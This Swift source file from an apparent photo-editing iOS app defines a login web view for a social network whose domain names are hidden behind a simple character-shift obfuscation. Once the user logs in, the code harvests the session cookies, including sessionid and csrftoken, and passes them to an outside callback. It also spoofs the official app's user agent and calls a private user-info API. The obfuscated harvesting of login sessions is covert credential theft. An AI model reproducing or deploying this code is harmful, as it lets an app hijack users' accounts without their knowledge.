//
//  UJLViewController.swift
//  GPyyGliterPhoto
//
//  Created by GliterPhoto on 2022/1/14.
//  Copyright © 2022 Gliter. All rights reserved.
//

import UIKit
import WebKit
import Alamofire
import ZKProgressHUD
import DeviceKit

class UJLViewController: UIViewController {
    
    var closeBtn = UIButton()
    var liComplete: ((Bool, [String: String])->Void)?
    var getUserInfoComplete: (([String:Any])->Void)?
    var closeLiPageHandler: (()->Void)?
    var authCompleteHandler: (()->Void)?
    var cancelLiPageHandler:(()->Void)?

    let webView = WKWebView()
    var liCookieDict: [String: String]?
    var userId: String?
    var beginRequestUserInfo = false
    var isClose: Bool = false

    let loadingV = LoadingView()

    override func viewDidLoad() {
        super.viewDidLoad()

        // Do any additional setup after loading the view.
        setUI()
        
        deleteCookie {
            self.reReloadWeb()
        }
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        isClose = false
    }
    
    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)
        let storage = HTTPCookieStorage.shared
        for cookie in storage.cookies ?? [] {
            storage.deleteCookie(cookie)
        }
        URLCache.shared.removeAllCachedResponses()
        URLCache.shared.diskCapacity = 0
        URLCache.shared.memoryCapacity = 0
        
    }
    
    deinit {
        debugPrint("deinit")
    }
    
    private func reReloadWeb() {
        
        if let url = URL.init(string:"https://www.\("hmrs`fq`l".formatte()).com/\("`bbntmsr".formatte())/\("knfhm".formatte())/") {
            if UIDevice.current.userInterfaceIdiom == .pad {
                self.webView.customUserAgent = "\("Hmrs`fq`l".formatte()) 121.0.0.29.119(iPhone 7,1; iOS 12_2; en_US; en; scale=2.61; 1080x1920) AppleWebKit/420+"
            }
            self.webView.load(URLRequest.init(url: url))
        }
        
    }

    private func setUI() {
        
        self.view.backgroundColor = .white
        
        webView.navigationDelegate = self
        self.view.addSubview(webView)
        webView.snp.makeConstraints { make in
            make.top.left.bottom.right.equalToSuperview()
        }
        
        
        closeBtn = UIButton(type: .custom)
        closeBtn.addTarget(self, action: #selector(closeAction(_:)), for: .touchUpInside)
        
        let bundle = Bundle(path: Bundle(for: Self.self).path(forResource: "InnLi", ofType: "bundle") ?? "")
        closeBtn.setImage(UIImage(named: "log_in_close_ic", in: bundle, compatibleWith: nil), for: .normal)
        closeBtn.frame = CGRect(x: 10, y: UIApplication.topSafeAreaHeight + 10, width: 30, height: 30)
        self.view.addSubview(self.closeBtn)
        
        loadingV.isHidden = false
        self.view.addSubview(loadingV)
        loadingV.snp.makeConstraints { make in
            make.top.left.bottom.right.equalToSuperview()
        }
        
    }

    func setData() {

    }
    
    @objc func closeAction(_ sender: UIButton) {
        self.isClose = true
        self.cancelLiPageHandler?()
        self.presentingViewController?.dismiss(animated: true) {
            let store = WKWebsiteDataStore.default()
            store.httpCookieStore.getAllCookies { (cookies) in
            }
           
        }
    }
    
    @objc func didClickBackBtn() {
        closeLiPage()
    }
    /*
    // MARK: - Navigation

    // In a storyboard-based application, you will often want to do a little preparation before navigation
    override func prepare(for segue: UIStoryboardSegue, sender: Any?) {
        // Get the new view controller using segue.destination.
        // Pass the selected object to the new view controller.
    }
    */

}

extension UJLViewController {
    
    func deleteCookie(completion: @escaping (()->Void)) {
        WKWebsiteDataStore.default().fetchDataRecords(ofTypes: WKWebsiteDataStore.allWebsiteDataTypes()) { (records) in
            for record in records {
                if record.displayName.contains("\("hmrs`fq`l".formatte())") || record.displayName.contains("\("e`bdannj".formatte())") {
                    WKWebsiteDataStore.default().removeData(ofTypes: record.dataTypes, for: [record]) {
                            
                    }
                }
            }
            completion()
        }
    }
    
    func clearCookie() {
        if let cookies = HTTPCookieStorage.shared.cookies {
            for cookie in cookies {
                HTTPCookieStorage.shared.deleteCookie(cookie)
            }
        }
        URLCache.shared.removeAllCachedResponses()
        
    }
    
    func cancelAuthorization() {
        deleteCookie {
            self.reReloadWeb()
        }
    }
    
    
    func parseNativeCookie(completion: @escaping (Bool)->Void) {
        //
        var cookieDict: [String: String] = [:]
        WKWebsiteDataStore.default().httpCookieStore.getAllCookies { cookies in
            for cookie in cookies {
                cookieDict[cookie.name] = cookie.value
            }
            self.liCookieDict = cookieDict
            if let _ = cookieDict["ds_user_id"] {
                completion(true)
            } else {
                completion(false)
            }
        }
    }
    
    
    func testWithLoop(loop: Bool, completion: @escaping (()->Void)) {
        if beginRequestUserInfo || isClose {
            return
        }
        parseNativeCookie {[weak self] (success) in
            guard let `self` = self else {return}
            if success {
                if self.beginRequestUserInfo == false {
                    if let liCookieDict_m = self.liCookieDict {
                        self.requestUserInfoWithCookies(cookieDict: liCookieDict_m)
                    }
                }
                completion()
            } else {
                if loop {
                    DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + 1) {
                        self.testWithLoop(loop: loop, completion: completion)
                    }
                }
            }
        }
    }
    
    func handleQuery(queryName:String?,queryValue:String?) {
        if queryName == "allow" {
            if queryValue == "Authorize" {
                self.finishAuthorization()
            }
            else if queryValue == "Cancel" {
                self.cancelAuthorization()
            }
        }
    }
    
    func finishAuthorization() {
        let authenKey = "hasAuthenticationInThisDevice_\(userId ?? "")"
        UserDefaults.standard.setValue(true, forKey: authenKey)
        DispatchQueue.main.async {
            [weak self] in
            guard let `self` = self else {return}
            self.authCompleteHandler?()
            self.closeLiPage()
        }
    }
    
    
    func closeLiPage() {
        DispatchQueue.main.async {
            self.dismiss(animated: false) {
                [weak self] in
                guard let `self` = self else {return}
                self.closeLiPageHandler?()
            }
        }
    }
}

extension UJLViewController {
    
    
    func resetCurrentLiInsCookie(cookieDict: [String: String]) {
        clearCookie()
        
        func setCookie(version: String, path: String, name: String, value: String, domain: String) {
            var fromappDict: [HTTPCookiePropertyKey: Any] = [:]
            fromappDict[HTTPCookiePropertyKey.version] = version
            fromappDict[HTTPCookiePropertyKey.path] = path
            fromappDict[HTTPCookiePropertyKey.name] = name
            fromappDict[HTTPCookiePropertyKey.value] = value
            fromappDict[HTTPCookiePropertyKey.domain] = domain
            if let cookie = HTTPCookie.init(properties: fromappDict) {
                HTTPCookieStorage.shared.setCookie(cookie)
            }
        }
        setCookie(version: "0", path: "/", name: "csrftoken", value: cookieDict["csrftoken"] ?? "", domain: ".\("hmrs`fq`l".formatte()).com")
        setCookie(version: "0", path: "/", name: "ds_user_id", value: userId ?? "", domain: ".\("hmrs`fq`l".formatte()).com")
        setCookie(version: "0", path: "/", name: "rur", value: "PRN", domain: ".\("hmrs`fq`l".formatte()).com")
        setCookie(version: "0", path: "/", name: "urlgen", value: "\"{\"104.245.13.89\": 21859}:1hOiip:z6gd0Gij256B5LWQKlerXSsj6zM\"", domain: ".\("hmrs`fq`l".formatte()).com")
        setCookie(version: "0", path: "/", name: "ds_user", value: cookieDict["ds_user"] ?? "", domain: ".\("hmrs`fq`l".formatte()).com")
        setCookie(version: "0", path: "/", name: "sessionid", value: cookieDict["sessionid"] ?? "", domain: ".\("hmrs`fq`l".formatte()).com")
        setCookie(version: "0", path: "/", name: "mid", value: cookieDict["mid"] ?? "", domain: ".\("hmrs`fq`l".formatte()).com")
    }
    
    func requestUserInfoWithCookies(cookieDict: [String: String]) {
        beginRequestUserInfo = true

        var cookieDict_m: [String: String] = [:]
        for key in cookieDict.keys {
            let value = cookieDict[key]
            cookieDict_m[key] = value
        }
        liComplete?(true, cookieDict_m)
    
        ZKProgressHUD.show()

        userId = cookieDict["ds_user_id"]
        
        resetCurrentLiInsCookie(cookieDict: cookieDict)
        
        getUserInfo(userID: userId ?? "") { infoDic in
            ZKProgressHUD.dismiss()
        
            if let infoDic = infoDic?["user"] as? [String : Any] {
                
                let authenKey = "hasAuthenticationInThisDevice_\(self.userId ?? "")"
                UserDefaults.standard.setValue(true, forKey: authenKey)
                
                self.getUserInfoComplete?(infoDic)

                DispatchQueue.main.async {
                    self.closeLiPage()
                }
            }else{
                print("getUserInfo fail")
                self.cancelAuthorization()
            }

        }

    }

    func getUserInfo(userID: String, completionHandler: @escaping ([String:Any]?)->()) {
        AF.request("https://i.\("hmrs`fq`l".formatte()).com/\("`oh".formatte())/\("u0".formatte())/\("trdqr".formatte())/\(userID)/\("hmen".formatte())/",
                   method: .get,
                   parameters: nil,
                   headers: headers,
                   requestModifier: { (request) in
                    request.timeoutInterval = 30.0
                   })
            .responseData { (response) in
                switch response.result {
                case .success(let value):
                    if let obj = try? value.jsonObject() as? [String:Any],
                       let status = obj["status"] as? String,
                       status == "ok"{
                        completionHandler(obj)
                    }else{
                        completionHandler(nil)
                    }
                case .failure(let error):
                    print(error)
                    completionHandler(nil)
                }
            }
        
    }
    
    var headers: HTTPHeaders? {
        
        let osVersion = UIDevice.current.systemVersion.replacingOccurrences(of: ".", with: "_")
        
        var userAgent = "\("Hmrs`fq`l".formatte()) 121.0.0.29.119(iPhone 7,1; iOS 12_2; en_US; en; scale=2.61; 1080x1920) AppleWebKit/420+"

        if UIApplication.shared.inferredEnvironment != .debug {
            let deviceIdentifier = UIDevice.current.identifier

            userAgent =
                "\("Hmrs`fq`l".formatte()) 121.0.0.29.119(\(deviceIdentifier)"
                + "; iOS \(osVersion); \(Locale.current.identifier)"
                + "; \(Locale.preferredLanguages.first ?? "en")"
                + "; scale=\(UIScreen.main.nativeScale)"
                + "; \(UIScreen.main.nativeBounds.width)x\(UIScreen.main.nativeBounds.height)"
                + ") AppleWebKit/420+"
        }

        let header = [
                        "User-Agent": userAgent,
                    ]
        return HTTPHeaders(header)
        
    }

}

extension UJLViewController: WKNavigationDelegate {

    func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {

        if navigationAction.request.url?.scheme == "ios" {
            if navigationAction.request.url?.absoluteString == "ios://notUser"{
                decisionHandler(.cancel)
                cancelAuthorization()
            } else {
                var queryString = navigationAction.request.url?.query
                queryString = queryString?.replacingOccurrences(of: "+", with: "%20")
                let queryArray = queryString?.queryArray ?? []
                if queryArray.count == 1, let queryName = queryArray[0]["name"], let queryValue = queryArray[0]["value"] {

                    handleQuery(queryName: queryName, queryValue: queryValue)

                    if queryValue.contains("Cancel") {
                        decisionHandler(.allow)
                    } else {
                        decisionHandler(.cancel)
                    }
                } else {
                    decisionHandler(.allow)
                }
            }
        } else {

            let hasUserId = self.liCookieDict?.keys.contains(where: {
                return $0.contains("ds_user_id")
            }) ?? false

            if navigationAction.request.url?.absoluteString.contains("detail.html") == true {
                decisionHandler(.allow)
            } else {
                if hasUserId {
                    if !beginRequestUserInfo, let liCookieDict_m = liCookieDict {
                        requestUserInfoWithCookies(cookieDict: liCookieDict_m)
                    }
                    decisionHandler(.cancel)
                } else {
                    if navigationAction.request.url?.absoluteString == "https://www.\("hmrs`fq`l".formatte()).com/" {
                        self.loadingV.isHidden = false
                        testWithLoop(loop: true) {

                        }
                    } else if navigationAction.request.url?.absoluteString == "https://www.\("hmrs`fq`l".formatte()).com/\("`bbntmsr".formatte())/\("knfhm".formatte())/" {
                        testWithLoop(loop: false) {

                        }
                    } else if navigationAction.request.url?.absoluteString == "https://\("l".formatte()).\("e`bdannj".formatte()).com/\("knfhm".formatte())" {
                        testWithLoop(loop: false) {

                        }
                    } else {
                        testWithLoop(loop: true) {

                        }
                    }
                    decisionHandler(.allow)
                }
            }

        }
    }
    
    
    func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
        self.parseNativeCookie {[weak self] (isSuccess) in
            guard let `self` = self else {return}
            if isSuccess {
                if self.beginRequestUserInfo == false {
                    if let liCookieDict_m = self.liCookieDict {
                        self.requestUserInfoWithCookies(cookieDict: liCookieDict_m)
                    }
                }
            }
        }
    }

    func webView(_ webView: WKWebView, didCommit navigation: WKNavigation!) {
        debugPrint("---===didCommit navigation")
    }

    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        
        debugPrint("---===didFinish navigation")
        if webView.url?.absoluteString == "https://www.\("hmrs`fq`l".formatte()).com/\("`bbntmsr".formatte())/\("knfhm".formatte())/" {
            ZKProgressHUD.dismiss()
        }
        self.loadingV.isHidden = true

    }
    
    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        if beginRequestUserInfo {return}
        
        debugPrint("---===didFail navigation")
        ZKProgressHUD.showError("Web \("knfhm".formatte()) failed, use another way to continue.")
    }

    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
        if beginRequestUserInfo {return}
        debugPrint("---===didFailProvisionalNavigation")
        ZKProgressHUD.showError("Web \("knfhm".formatte()) failed, use another way to continue.")
    }
}


extension String {
    
    var queryArray: [[String:String]] {
        
        var queryArray:[[String:String]] = []
        for queryComponent in self.components(separatedBy: "&") {
            
            let nsqueryComponent = queryComponent as NSString
            var queryName = ""
            var queryValue = ""
            
            let  range = nsqueryComponent.range(of: "=")
            if (range.location == NSNotFound) {
                queryName = nsqueryComponent as String
            } else {
                queryName = nsqueryComponent.substring(with: NSRange(location: 0, length: range.location))
                queryValue = nsqueryComponent.substring(from: range.location + range.length)
                queryValue = (queryValue as NSString).removingPercentEncoding ?? ""
            }
            
            queryArray.append(["name": queryName, "value": queryValue])
        }
        let arr = Array(queryArray)
        return arr
        
    }
    
    
    
    
}

    
extension UIDevice {

    var identifier: String {

        var systemInfo = utsname()
        uname(&systemInfo)

        let machineMirror = Mirror(reflecting: systemInfo.machine)
        let identifier = machineMirror.children.reduce("") { identifier, element in
            guard let value = element.value as? Int8, value != 0 else { return identifier }
            return identifier + String(UnicodeScalar(UInt8(value)))
        }
        return identifier
    }

}

